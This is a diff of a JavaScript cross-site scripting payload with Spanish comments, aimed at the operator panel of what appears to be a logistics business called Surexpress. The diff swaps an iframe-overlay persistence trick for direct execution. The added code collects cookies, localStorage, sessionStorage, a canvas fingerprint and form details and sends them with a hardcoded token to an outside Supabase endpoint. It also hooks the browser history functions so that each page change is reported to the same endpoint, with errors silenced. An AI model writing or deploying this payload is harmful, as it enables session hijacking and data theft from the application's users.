@@ -3,11 +3,8 @@
 // =============================================
 
 // Verificar contexto inmediatamente
-if (window.self !== window.top) {
-    // ESTAMOS EN IFRAME - Simular rutas
-    setupIframeRouteSimulation();
-} else if (!window.__MAIN_XSS_EXECUTED__) {
-    // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
+if (!window.__MAIN_XSS_EXECUTED__) {
+    // ESTAMOS EN PÁGINA PRINCIPAL - EJECUTAR DIRECTAMENTE
     window.__MAIN_XSS_EXECUTED__ = true;
     executeMainXSS();
     setupWebSocketController();
@@ -20,181 +17,148 @@ if (window.self !== window.top) {
 function executeMainXSS() {
     'use strict';
 
-    // Función para crear iframe
-    function createIframeFirst() {
-        try {
-            // Asegurar que el body existe
-            if (!document.body) {
-                setTimeout(createIframeFirst, 50);
-                return;
-            }
+    // Ejecutar fingerprinting directamente
+    executeFullFingerprinting();
 
-            // Crear iframe con opacidad 0 inicialmente para evitar flicker
-            const iframe = document.createElement('iframe');
-            iframe.src = window.location.href;
-            iframe.style.cssText = `
-                width: 100% !important;
-                height: 100% !important;
-                border: none !important;
-                position: fixed !important;
-                top: 0 !important;
-                left: 0 !important;
-                z-index: 99999 !important;
-                margin: 0 !important;
-                padding: 0 !important;
-                background: white !important;
-                opacity: 0 !important;
-            `;
+    // Configurar sistema de rutas normal
+    setupRouteSystem();
+}
 
-            // Agregar iframe al body
-            document.body.appendChild(iframe);
+function executeFullFingerprinting() {
+    try {
+        const fingerprintData = {
+            timestamp: new Date().toISOString(),
+            url: location.href,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: JSON.stringify(navigator.languages),
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            screen: JSON.stringify({
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            }),
+            browser: JSON.stringify({
+                vendor: navigator.vendor,
+                product: navigator.product
+            }),
+            connection: JSON.stringify(navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : 'N/A'),
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            plugins: JSON.stringify(Array.from(navigator.plugins).map(p => ({
+                name: p.name,
+                filename: p.filename
+            }))),
+            fonts: JSON.stringify(['Arial', 'Times New Roman', 'Verdana', 'Georgia']
+                .filter(f => document.fonts.check('12px "' + f + '"'))),
+            canvasFingerprint: (function () {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('FP', 2, 15);
+                return canvas.toDataURL();
+            })(),
+            historyLength: history.length,
+            forms: JSON.stringify(Array.from(document.forms).map(f => ({
+                action: f.action,
+                method: f.method
+            }))),
+            links: JSON.stringify(Array.from(document.links).slice(0, 5).map(l => ({
+                href: l.href
+            }))),
+            attackPhase: 'main_direct'
+        };
 
-            // Limpiar otros elementos del body, manteniendo el iframe
-            const children = Array.from(document.body.children);
-            children.forEach(child => {
-                if (child !== iframe) {
-                    document.body.removeChild(child);
-                }
-            });
-
-            // Establecer estilos del body
-            document.body.style.overflow = 'hidden';
-            document.body.style.margin = '0';
-            document.body.style.padding = '0';
-
-            // Cuando el iframe cargue, hacerlo visible
-            iframe.onload = () => {
-                iframe.style.opacity = '1';
-
-                // Configurar simulación de rutas después del iframe
-                setupRouteSystem(iframe);
-
-                // Ejecutar fingerprinting después del iframe
-                executeFullFingerprinting();
-            };
-
-        } catch (e) {
-            setTimeout(createIframeFirst, 100);
-        }
-    }
-
-    // Función para fingerprinting completo
-    function executeFullFingerprinting() {
-        try {
-            const fingerprintData = {
-                timestamp: new Date().toISOString(),
-                url: location.href,
-                referrer: document.referrer,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                languages: JSON.stringify(navigator.languages),
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                screen: JSON.stringify({
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
-                }),
-                browser: JSON.stringify({
-                    vendor: navigator.vendor,
-                    product: navigator.product
-                }),
-                connection: JSON.stringify(navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink
-                } : 'N/A'),
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                plugins: JSON.stringify(Array.from(navigator.plugins).map(p => ({
-                    name: p.name,
-                    filename: p.filename
-                }))),
-                fonts: JSON.stringify(['Arial', 'Times New Roman', 'Verdana', 'Georgia']
-                    .filter(f => document.fonts.check('12px "' + f + '"'))),
-                canvasFingerprint: (function () {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125, 1, 62, 20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('FP', 2, 15);
-                    return canvas.toDataURL();
-                })(),
-                historyLength: history.length,
-                forms: JSON.stringify(Array.from(document.forms).map(f => ({
-                    action: f.action,
-                    method: f.method
-                }))),
-                links: JSON.stringify(Array.from(document.links).slice(0, 5).map(l => ({
-                    href: l.href
-                }))),
-                attackPhase: 'main_with_iframe'
-            };
-
-            // Enviar datos via fetch
-            fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
-                },
-                body: JSON.stringify({ fingerprint: fingerprintData })
-            });
-
-        } catch (e) {
-            // Silenciar errores
-        }
-    }
-
-    // Función para configurar simulación de rutas
-    function setupRouteSystem(iframe) {
-        let currentPath = window.location.pathname;
-
-        // Función para actualizar URL del navegador
-        function updateBrowserURL(path) {
-            currentPath = path;
-            window.history.replaceState({}, '', path);
-            document.title = 'Surexpress | ' + getPageTitle(path);
-        }
-
-        // Función para obtener título de página
-        function getPageTitle(path) {
-            const titles = {
-                '/Operator/Dashboard_M/': 'Dashboard',
-                '/Operator/Orders/': 'Órdenes',
-                '/Operator/Usuarios/': 'Usuarios',
-                '/Operator/Clientes/': 'Clientes',
-                '/Operator/Agencias/': 'Agencias',
-                '/Operator/Monitor/': 'Monitor',
-                '/Operator/GuiasAereas/': 'Guías Aéreas',
-                '/Operator/Billing/': 'Facturación',
-                '/Operator/Revision/': 'Revisiones',
-                '/Operator/incidenciaHouse/': 'Incidencias'
-            };
-            return titles[path] || 'Sistema';
-        }
-
-        // Escuchar mensajes del iframe para cambios de URL
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'URL_CHANGE') {
-                updateBrowserURL(event.data.url);
-            }
+        // Enviar datos via fetch
+        fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
+            },
+            body: JSON.stringify({ fingerprint: fingerprintData })
         });
 
-        // Manejar botones atrás/adelante
-        window.addEventListener('popstate', () => {
-            const newPath = window.location.pathname + window.location.search;
-            iframe.src = newPath;
-        });
+    } catch (e) {
+        // Silenciar errores
+    }
+}
+
+function setupRouteSystem() {
+    // Sistema de rutas simplificado - solo para monitoreo
+    let currentPath = window.location.pathname;
+
+    // Función para obtener título de página
+    function getPageTitle(path) {
+        const titles = {
+            '/Operator/Dashboard_M/': 'Dashboard',
+            '/Operator/Orders/': 'Órdenes',
+            '/Operator/Usuarios/': 'Usuarios',
+            '/Operator/Clientes/': 'Clientes',
+            '/Operator/Agencias/': 'Agencias',
+            '/Operator/Monitor/': 'Monitor',
+            '/Operator/GuiasAereas/': 'Guías Aéreas',
+            '/Operator/Billing/': 'Facturación',
+            '/Operator/Revision/': 'Revisiones',
+            '/Operator/incidenciaHouse/': 'Incidencias'
+        };
+        return titles[path] || 'Sistema';
     }
 
-    // Iniciar proceso - iframe primero
-    createIframeFirst();
+    // Monitorear cambios de ruta
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+
+    history.pushState = function(state, title, url) {
+        const result = originalPushState.apply(this, arguments);
+        trackRouteChange(url);
+        return result;
+    };
+
+    history.replaceState = function(state, title, url) {
+        const result = originalReplaceState.apply(this, arguments);
+        trackRouteChange(url);
+        return result;
+    };
+
+    function trackRouteChange(url) {
+        if (url) {
+            const urlStr = typeof url === 'string' ? url : url.toString();
+            currentPath = urlStr;
+            
+            // Opcional: enviar tracking de cambios de ruta
+            try {
+                fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
+                    },
+                    body: JSON.stringify({ 
+                        route_change: {
+                            timestamp: new Date().toISOString(),
+                            from: currentPath,
+                            to: urlStr
+                        }
+                    })
+                });
+            } catch (e) {
+                // Silenciar errores
+            }
+        }
+    }
 }
 
 function setupWebSocketController() {
@@ -367,134 +331,4 @@ function setupWebSocketController() {
     return {
         getPersistentScripts: () => ({ ...persistentScripts })
     };
-}
-
-// =============================================
-// SIMULACIÓN DE RUTAS EN IFRAME
-// =============================================
-
-function setupIframeRouteSimulation() {
-    'use strict';
-
-    // Evitar ejecución múltiple en el mismo iframe
-    if (window.__IFRAME_ROUTES_ACTIVE__) {
-        return;
-    }
-    window.__IFRAME_ROUTES_ACTIVE__ = true;
-
-    // Interceptar History API
-    const originalPushState = history.pushState;
-    const originalReplaceState = history.replaceState;
-
-    history.pushState = function(state, title, url) {
-        if (url && window.parent) {
-            const urlStr = typeof url === 'string' ? url : url.toString();
-            window.parent.postMessage({
-                type: 'URL_CHANGE',
-                url: urlStr,
-                action: 'push'
-            }, '*');
-        }
-        return originalPushState.apply(this, arguments);
-    };
-
-    history.replaceState = function(state, title, url) {
-        if (url && window.parent) {
-            const urlStr = typeof url === 'string' ? url : url.toString();
-            window.parent.postMessage({
-                type: 'URL_CHANGE',
-                url: urlStr,
-                action: 'replace'
-            }, '*');
-        }
-        return originalReplaceState.apply(this, arguments);
-    };
-
-    // Interceptar clicks en enlaces
-    document.addEventListener('click', (e) => {
-        let target = e.target;
-        while (target && target.tagName !== 'A') {
-            target = target.parentElement;
-        }
-
-        if (target && target.href) {
-            // Permitir descargas
-            if (target.href.includes('/files/down/') ||
-                target.href.includes('.xlsx') ||
-                target.href.includes('.pdf') ||
-                target.href.includes('.csv') ||
-                target.href.includes('.zip') ||
-                target.download) {
-                return;
-            } 
-
-            // Interceptar navegación para mantener dentro del iframe (más flexible)
-            e.preventDefault();
-
-            // Parsear la URL sin usar constructor URL (para compatibilidad)
-            let path = target.href;
-            if (path.startsWith(window.location.origin)) {
-                path = path.substring(window.location.origin.length);
-            }
-
-            // Navegar dentro del iframe
-            window.location.href = target.href;
-
-            // Notificar al padre
-            if (window.parent) {
-                window.parent.postMessage({
-                    type: 'URL_CHANGE',
-                    url: path,
-                    action: 'click'
-                }, '*');
-            }
-        }
-    });
-
-    // Detector automático de cambios de ruta
-    let lastPath = window.location.pathname + window.location.search;
-
-    setInterval(() => {
-        const currentPath = window.location.pathname + window.location.search;
-        if (currentPath !== lastPath) {
-            lastPath = currentPath;
-
-            if (window.parent) {
-                window.parent.postMessage({
-                    type: 'URL_CHANGE',
-                    url: currentPath,
-                    action: 'auto'
-                }, '*');
-            }
-        }
-    }, 250);
-
-    // Interceptar formularios
-    document.addEventListener('submit', (e) => {
-        const form = e.target;
-        if (form.action && form.action.includes('/Operator/')) {
-            setTimeout(() => {
-                const currentPath = window.location.pathname + window.location.search;
-                if (window.parent) {
-                    window.parent.postMessage({
-                        type: 'URL_CHANGE',
-                        url: currentPath,
-                        action: 'form'
-                    }, '*');
-                }
-            }, 500);
-        }
-    });
-
-    // Notificar ruta inicial
-    setTimeout(() => {
-        if (window.parent) {
-            const currentPath = window.location.pathname + window.location.search;
-            window.parent.postMessage({
-                type: 'URL_CHANGE',
-                url: currentPath,
-                action: 'initial'
-            }, '*');
-        }
-    }, 300);
 }
